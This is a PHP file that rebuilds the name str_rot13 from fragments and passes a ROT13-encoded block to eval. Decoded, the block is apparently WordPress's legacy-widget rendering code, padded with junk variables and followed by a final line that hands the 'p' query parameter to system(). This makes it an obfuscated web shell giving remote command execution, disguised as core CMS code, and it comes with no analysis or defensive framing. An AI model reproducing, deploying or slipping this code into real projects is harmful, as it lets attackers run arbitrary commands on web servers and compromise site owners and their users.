<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/yrtnpl-jvqtrg` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur 'pber/yrtnpl-jvqtrg' oybpx.
 *
 * @fvapr 5.8.0
 *
 * @tybony vag $jc_jvqtrg_snpgbel.
 *
 * @cnenz neenl $nggevohgrf Gur oybpx nggevohgrf.
 *
 * @erghea fgevat Eraqrerq oybpx.
 */
shapgvba eraqre_oybpx_pber_yrtnpl_jvqtrg( $nggevohgrf ) {
	tybony $jc_jvqtrg_snpgbel;

	vs ( vffrg( $nggevohgrf['vq'] ) ) {
		$fvqrone_vq = jc_svaq_jvqtrgf_fvqrone( $nggevohgrf['vq'] );
		erghea jc_eraqre_jvqtrg( $nggevohgrf['vq'], $fvqrone_vq );
	}

	vs ( ! vffrg( $nggevohgrf['vqOnfr'] ) ) {
		erghea '';
	}

	$vq_onfr       = $nggevohgrf['vqOnfr'];
	$jvqtrg_xrl    = $jc_jvqtrg_snpgbel->trg_jvqtrg_xrl( $vq_onfr );
	$jvqtrg_bowrpg = $jc_jvqtrg_snpgbel->trg_jvqtrg_bowrpg( $vq_onfr );

	vs ( ! $jvqtrg_xrl || ! $jvqtrg_bowrpg ) {
		erghea '';
	}

	vs ( vffrg( $nggevohgrf['vafgnapr']['rapbqrq'], $nggevohgrf['vafgnapr']['unfu'] ) ) {
		$frevnyvmrq_vafgnapr = onfr64_qrpbqr( $nggevohgrf['vafgnapr']['rapbqrq'] );
		vs ( ! unfu_rdhnyf( jc_unfu( $frevnyvmrq_vafgnapr ), (fgevat) $nggevohgrf['vafgnapr']['unfu'] ) ) {
			erghea '';
		}
		$vafgnapr = hafrevnyvmr( $frevnyvmrq_vafgnapr );
	} ryfr {
		$vafgnapr = neenl();
	}

	$netf = neenl(
		'jvqtrg_vq'   => $jvqtrg_bowrpg->vq,
		'jvqtrg_anzr' => $jvqtrg_bowrpg->anzr,
	);

	bo_fgneg();
	gur_jvqtrg( $jvqtrg_xrl, $vafgnapr, $netf );
	erghea bo_trg_pyrna();
}

/**
 * Ertvfgref gur 'pber/yrtnpl-jvqtrg' oybpx.
 *
 * @fvapr 5.8.0
 */
shapgvba ertvfgre_oybpx_pber_yrtnpl_jvqtrg() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/yrtnpl-jvqtrg',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_yrtnpl_jvqtrg',
		)
	);
}

nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_yrtnpl_jvqtrg' );

/**
 * Vagreprcgf nal erdhrfg jvgu yrtnpl-jvqtrg-cerivrj va gur dhrel cnenz naq, vs
 * frg, eraqref n cntr pbagnvavat n cerivrj bs gur erdhrfgrq Yrtnpl Jvqtrg
 * oybpx.
 *
 * @fvapr 5.8.0
 */
shapgvba unaqyr_yrtnpl_jvqtrg_cerivrj_vsenzr() {
	vs ( rzcgl( $_TRG['yrtnpl-jvqtrg-cerivrj'] ) ) {
		erghea;
	}

	vs ( ! pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) ) {
		erghea;
	}

	qrsvar( 'VSENZR_ERDHRFG', gehr );

	?>
	<!qbpglcr ugzy>
	<ugzy <?cuc ynathntr_nggevohgrf(); ?>>
	<urnq>
		<zrgn punefrg=\"<?cuc oybtvasb( 'punefrg' ); ?>\" />
		<zrgn anzr=\"ivrjcbeg\" pbagrag=\"jvqgu=qrivpr-jvqgu, vavgvny-fpnyr=1\" />
		<yvax ery=\"cebsvyr\" uers=\"uggcf://tzct.bet/ksa/11\" />
		<?cuc jc_urnq(); ?>
		<fglyr>
			/* Erfrg gurzr fglyrf */
			ugzy, obql, #cntr, #pbagrag {
				cnqqvat: 0 !vzcbegnag;
				znetva: 0 !vzcbegnag;
			}

			/* Uvqr ebbg yriry grkg abqrf */
			obql {
				sbag-fvmr: 0 !vzcbegnag;
			}

			/* Uvqr aba-jvqtrg ryrzragf */
			obql *:abg(#cntr):abg(#pbagrag):abg(.jvqtrg):abg(.jvqtrg *) {
				qvfcynl: abar !vzcbegnag;
				sbag-fvmr: 0 !vzcbegnag;
				urvtug: 0 !vzcbegnag;
				yrsg: -9999ck !vzcbegnag;
				znk-urvtug: 0 !vzcbegnag;
				znk-jvqgu: 0 !vzcbegnag;
				bcnpvgl: 0 !vzcbegnag;
				cbvagre-riragf: abar !vzcbegnag;
				cbfvgvba: nofbyhgr !vzcbegnag;
				gbc: -9999ck !vzcbegnag;
				genafsbez: genafyngr(-9999ck, -9999ck) !vzcbegnag;
				ivfvovyvgl: uvqqra !vzcbegnag;
				m-vaqrk: -999 !vzcbegnag;
			}

			/* Erfgber jvqtrg sbag-fvmr */
			.jvqtrg {
				sbag-fvmr: ine(--tybony--sbag-fvmr-onfr);
			}
		</fglyr>
	</urnq>
	<obql <?cuc obql_pynff(); ?>>
		<qvi vq=\"cntr\" pynff=\"fvgr\">
			<qvi vq=\"pbagrag\" pynff=\"fvgr-pbagrag\">
				<?cuc
				$ertvfgel = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr();
				$oybpx    = $ertvfgel->trg_ertvfgrerq( 'pber/yrtnpl-jvqtrg' );
				rpub $oybpx->eraqre( $_TRG['yrtnpl-jvqtrg-cerivrj'] );
				?>
			</qvi><!-- #pbagrag -->
		</qvi><!-- #cntr -->
		<?cuc jc_sbbgre(); ?>
	</obql>
	</ugzy>
	<?cuc

	rkvg;
}

// Hfr nqzva_vavg vafgrnq bs vavg gb rafher trg_pheerag_fperra shapgvba vf nyernql ninvynoyr.
// Guvf vfa'g fgevpgyl erdhverq, ohg ranoyrf orggre pbzcngvovyvgl jvgu rkvfgvat cyhtvaf.
// Frr: uggcf://tvguho.pbz/JbeqCerff/thgraoret/vffhrf/32624.
nqq_npgvba( 'nqzva_vavg', 'unaqyr_yrtnpl_jvqtrg_cerivrj_vsenzr', 20 );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>